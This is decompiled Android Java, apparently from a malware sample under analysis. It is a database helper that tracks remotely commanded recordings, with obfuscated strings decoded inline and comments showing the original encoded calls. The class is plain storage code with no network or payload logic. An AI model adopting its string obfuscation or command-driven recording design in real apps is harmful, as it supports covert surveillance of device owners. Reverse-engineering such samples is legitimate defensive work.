package com.wish.lmbank.db;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;

import com.wish.lmbank.bean.CommandRecordingBean;
import com.wish.lmbank.temp.Debugging;
import com.wish.lmbank.utils.LogUtils;

import java.util.ArrayList;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/db/CommandRecordingDB.class */
public class CommandRecordingDB extends RecordingDB {
    public static final String STATUS_EXECUTING = "executing";
    public static final String STATUS_FINISHED = "finished";
    public static final String STATUS_RECEIVED = "received";
    private static final String TAG = "com.wish.lmbank.db.CommandRecordingDB";
    private static CommandRecordingDB instance;

    public static CommandRecordingDB getInstance(Context context) {
        CommandRecordingDB commandRecordingDB;
        synchronized (CommandRecordingDB.class) {
            try {
                if (instance == null) {
                    instance = new CommandRecordingDB(context.getApplicationContext());
                }
                commandRecordingDB = instance;
            } catch (Throwable th) {
                throw th;
            }
        }
        return commandRecordingDB;
    }

    private CommandRecordingDB(Context context) {
//         super(context, bb7d7pu7.m5998("CgYEBAgHDTYbDAoGGw0ABw4"));
        super(context, "command_recording");
    }

    public long addCommandRecording(int i, long j) {
        synchronized (this) {
            ArrayList<CommandRecordingBean> queryCommandRecordingByrId = queryCommandRecordingByrId(i);
            if (queryCommandRecordingByrId == null || queryCommandRecordingByrId.size() == 0) {
                ContentValues contentValues = new ContentValues();
//                 contentValues.put(bb7d7pu7.m5998("GyAN"), Integer.valueOf(i));
                contentValues.put("rId", Integer.valueOf(i));
//                 contentValues.put(bb7d7pu7.m5998("DRwbCB0ABgc"), Long.valueOf(j));
                contentValues.put("duration", Long.valueOf(j));
//                 contentValues.put(bb7d7pu7.m5998("GQgdAQ"), "");
                contentValues.put("path", "");
//                 contentValues.put(bb7d7pu7.m5998("ChsMCB0MHQAEDA"), Long.valueOf(System.currentTimeMillis()));
                contentValues.put("createtime", Long.valueOf(System.currentTimeMillis()));
//                 contentValues.put(bb7d7pu7.m5998("HBkNCB0MHQAEDA"), Long.valueOf(System.currentTimeMillis()));
                contentValues.put("updatetime", Long.valueOf(System.currentTimeMillis()));
//                 contentValues.put(bb7d7pu7.m5998("Gh0IHRwa"), bb7d7pu7.m5998("GwwKDAAfDA0"));
                contentValues.put("status", "received");
                return insertOrReplace(contentValues);
            }
            return 0L;
        }
    }

    public long updateCommandRecordingStatus(int i, String str, String str2) {
        long update;
        synchronized (this) {
            ContentValues contentValues = new ContentValues();
//             contentValues.put(bb7d7pu7.m5998("Gh0IHRwa"), str2);
            contentValues.put("status", str2);
//             contentValues.put(bb7d7pu7.m5998("GQgdAQ"), str);
            contentValues.put("path", str);
//             contentValues.put(bb7d7pu7.m5998("HBkNCB0MHQAEDA"), Long.valueOf(System.currentTimeMillis()));
            contentValues.put("updatetime", Long.valueOf(System.currentTimeMillis()));
//             update = update(contentValues, bb7d7pu7.m5998("GyANSVRJVkk"), new String[]{Integer.toString(i)});
            update = update(contentValues, "rId = ? ", new String[]{Integer.toString(i)});
        }
        return update;
    }

    public ArrayList<CommandRecordingBean> queryCommandRecordingByrId(int i) {
        ArrayList<CommandRecordingBean> arrayList;
        Cursor cursor = null;
        synchronized (this) {
            arrayList = new ArrayList<>();
            try {
//-^-                 cursor = query(new String[]{bb7d7pu7.m5998("AA0")}, bb7d7pu7.m5998("GyANSVRJVkk"), new String[]{Integer.toString(i)});
                cursor = query(new String[]{"id"}, "rId = ? ", new String[]{Integer.toString(i)});
                while (cursor.moveToNext()) {
                    arrayList.add(getCommandRecording(cursor));
                }
            } catch (SQLException e) {
//-^-                 LogUtils.w(TAG, bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e);
                LogUtils.w(TAG, "Error loading preview from DB", e);
            }
        }
        return arrayList;
    }


    public ArrayList<CommandRecordingBean> queryCommandRecordingByStatus(String str) {
        ArrayList<CommandRecordingBean> arrayList;
        Cursor cursor = null;
        synchronized (this) {
            arrayList = new ArrayList<>();
            try {
//-^-                 cursor = query(new String[]{bb7d7pu7.m5998("AA0"), bb7d7pu7.m5998("GyAN"), bb7d7pu7.m5998("DRwbCB0ABgc"), bb7d7pu7.m5998("GQgdAQ"), bb7d7pu7.m5998("ChsMCB0MHQAEDA"), bb7d7pu7.m5998("HBkNCB0MHQAEDA"), bb7d7pu7.m5998("Gh0IHRwa")}, bb7d7pu7.m5998("Gh0IHRwaSVRJVkk"), new String[]{str});
                cursor = query(new String[]{"id", "rId", "duration", "path", "createtime", "updatetime", "status"}, "status = ? ", new String[]{str});
                while (cursor.moveToNext()) {
                    arrayList.add(getCommandRecording(cursor));
                }
            } catch (SQLException e) {
//-^-                 LogUtils.w(TAG, bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e);
                LogUtils.w(TAG, "Error loading preview from DB", e);
            }
        }
        return arrayList;
    }

    @SuppressLint("Range")
    private CommandRecordingBean getCommandRecording(Cursor cursor) {
        CommandRecordingBean commandRecordingBean = new CommandRecordingBean();
//-^-         commandRecordingBean.setId(cursor.getInt(cursor.getColumnIndex(bb7d7pu7.m5998("AA0"))));
        commandRecordingBean.setId(cursor.getInt(cursor.getColumnIndex("id")));
//-^-         commandRecordingBean.setrId(cursor.getInt(cursor.getColumnIndex(bb7d7pu7.m5998("GyAN"))));
        commandRecordingBean.setrId(cursor.getInt(cursor.getColumnIndex("rId")));
//-^-         commandRecordingBean.setDuration(cursor.getLong(cursor.getColumnIndex(bb7d7pu7.m5998("DRwbCB0ABgc"))));
        commandRecordingBean.setDuration(cursor.getLong(cursor.getColumnIndex("duration")));
//-^-         commandRecordingBean.setPath(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("GQgdAQ"))));
        commandRecordingBean.setPath(cursor.getString(cursor.getColumnIndex("path")));
//-^-         commandRecordingBean.setCreatetime(cursor.getLong(cursor.getColumnIndex(bb7d7pu7.m5998("ChsMCB0MHQAEDA"))));
        commandRecordingBean.setCreatetime(cursor.getLong(cursor.getColumnIndex("createtime")));
//-^-         commandRecordingBean.setUpdatetime(cursor.getLong(cursor.getColumnIndex(bb7d7pu7.m5998("HBkNCB0MHQAEDA"))));
        commandRecordingBean.setUpdatetime(cursor.getLong(cursor.getColumnIndex("updatetime")));
//-^-         commandRecordingBean.setStatus(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("Gh0IHRwa"))));
        commandRecordingBean.setStatus(cursor.getString(cursor.getColumnIndex("status")));
        return commandRecordingBean;
    }


    public long deleteCommandRecordingById(int i) {
        long delete;
        synchronized (this) {
//                 delete = delete(bb7d7pu7.m5998("AA1JVElWSQ"), new String[]{Integer.toString(i)});
            delete = delete("id = ? ", new String[]{Integer.toString(i)});
        }
        return delete;
    }

    public long deleteCommandRecording() {
        long delete;
        synchronized (this) {
//             delete = delete(bb7d7pu7.m5998("WElUSVg"), new String[0]);
            delete = delete("1 = 1", new String[0]);
        }
        return delete;
    }
}
